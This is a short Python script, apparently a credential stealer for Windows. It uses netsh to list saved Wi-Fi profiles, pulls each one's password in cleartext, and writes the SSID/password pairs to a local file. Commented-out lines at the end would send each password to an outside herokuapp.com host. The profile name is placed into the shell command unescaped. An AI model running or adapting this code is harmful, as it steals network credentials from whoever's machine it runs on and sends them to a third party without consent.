import os
import requests

# this function returns all wifi profile names
def GET_PROFILE_NAME():
    # getting all data form wifi using windows CMD comands
    os.system("netsh wlan show profiles > profiles.txt")
    profile_name = []
    with open("profiles.txt" , "r") as file:
        profiles = file.readlines()
        for profile in profiles:
            if "All User Profile" in profile:
                name = profile.split(":")[1].replace("\n","")[1:]
                profile_name.append(name)
    os.remove("profiles.txt")
    return profile_name
         
        
    
# this function returns all passwords with SSID
def GET_WIFI_PASS():
    All_profile = (GET_PROFILE_NAME())
    SSID_AND_PASS = []
    for profile in All_profile:
        # getting All data of wifi using Windows CMD comands
        os.system(f'netsh wlan show profile name="{profile}" key="clear" > WifiPass.txt')
        
        with open("WifiPass.txt", "r") as file: 
            data = file.readlines()
            wifi = ""
            for i in data:
                if "SSID name" in i:
                    wifi += i.replace("\n" ,"" ).replace(",","")
                if "Key Content" in i:
                    wifi += i.replace("\n" ,"" ).replace(",","")
            Name_Pass = (wifi.split(":"))
            SSID_PASS = (f'''Wifi:{Name_Pass[1].split('"')[1]} Pass:{Name_Pass[2]}''')
            SSID_AND_PASS.append(SSID_PASS)
    os.remove("WifiPass.txt")
    return SSID_AND_PASS

wifi_pass = GET_WIFI_PASS()


# writing the password in a passwords.txt file 

with open("wifipass.txt","a") as file:
    for i in wifi_pass:
        file.write(i+'\n')
        
        
# for i in wifi_pass:
#     print(i)
#     a = requests.post(url="https://protanhalder-wifi-pass.herokuapp.com", data={"password":i})
#     print(a.status_code)